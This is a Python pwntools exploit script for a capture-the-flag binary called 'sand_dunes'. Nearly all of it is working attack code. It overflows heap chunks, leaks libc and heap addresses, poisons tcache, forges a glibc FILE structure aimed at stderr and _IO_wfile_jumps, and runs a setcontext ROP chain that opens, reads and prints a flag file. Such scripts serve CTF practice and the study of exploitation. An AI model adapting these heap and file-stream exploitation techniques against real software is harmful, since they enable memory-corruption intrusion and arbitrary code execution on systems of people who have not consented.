# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './sand_dunes'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('>> ',num)

def add(size , text = 'a'):
    cmd(1)
    sla('Size:' , size)
    sla('Message:' , text)

def show(idx ):
    cmd(3)
    sla('Index:' , idx)

def delete(idx ):
    cmd(2)
    sla('Index:' , idx)

def code1(idx,code):
    cmd(4)
    sla('Index:' , idx)
    sa('Code' ,code )

def code2(idx,code):
    cmd(5)
    sla('Index:' , idx)
    sa('Code' ,code )

def pack_file(_flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = 0,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = 0,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _lock = 0,
    _wide_data = 0,
    _mode = 0):
    file_struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno)
    file_struct = file_struct.ljust(0x88, '\x00')
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, '\x00')
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, '\x00')
    return file_struct

def attack():
    
    add(0x108,'a'*0x108) #0
 
    add(0x328) #1
    add(0x108) #2
    add(0x108) #3

    payload = '[^{^{^{^{^{^{^{^{]]'
    code2( 0 , payload)
    se('\x00'*0x108 + p64(0x441) + p64(0) )

    delete(1)
    add(0x328) #1
    show(2)
    leak = l64() 

    libc.address = leak - 0x219ce0
    libc_base = libc.address
    stderr = libc.sym['stderr']
    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    _lock = libc_base + 0x21ba60
    setcontext = 0x53a30 + libc_base
    mprotect = libc.sym['mprotect']
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    ret = pop_rdi_ret + 1
    syscall = libc_base + 0x0EA5B9

    __free_hook = libc.sym['__free_hook']
    setcontext = libc.sym['setcontext']
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    write_addr = libc.sym['write']

    add(0x108) #4->2
    delete(4)
    show(2)

    ru('Message: ')
    key = uu64(5)
    heap_base = key << 12

    add(0x108) #4->2

    fake_io_addr = heap_base + 0x900 
    file = pack_file(
        _flags = 0,
        _lock = _lock,
        _IO_write_ptr = 0xa81,
        _wide_data = fake_io_addr + 0xe0 ,
    ) + p64(_IO_wfile_jumps)

    flag_addr = fake_io_addr + 0x300

    payload = p64(fake_io_addr + 0xe8)+'\x00'*0x98
    payload += flat(fake_io_addr + 0xe0*2+0x10 , pop_rdi_ret +1)
    payload += '\x00'*0x30
    payload += p64(fake_io_addr + 0xe0*2-0x68+8)
    payload += p64(setcontext+61)
    payload += flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , 1 , write_addr
    )
    payload = file + payload

    payload = payload.ljust( 0x300,'\x00')+ 'flag\x00'

    add(0x500 ,  payload )

    delete(3)
    delete(4)

    payload = '&>'*8
    code1(2 , payload)
    se( p64(key^(heap_base + 0xe00) ) )

    add(0x108)
    add(0x108 , flat(0 , 0x440 ))

    delete(0)
    delete(3)

    payload = '&>'*8
    code1(2 , payload + '\n')
    se( p64(key^stderr) )

    add(0x108)
    add(0x108 ,p64(fake_io_addr))

    
    cmd(1)
    dbg('_IO_wfile_overflow')
    sla('Size:' , 0x600)

    # dbg()

    p.interactive()

attack()

'''
@File    :   sand_dunes.py
@Time    :   2022/08/24 16:14:31
@Author  :   Niyah 
'''
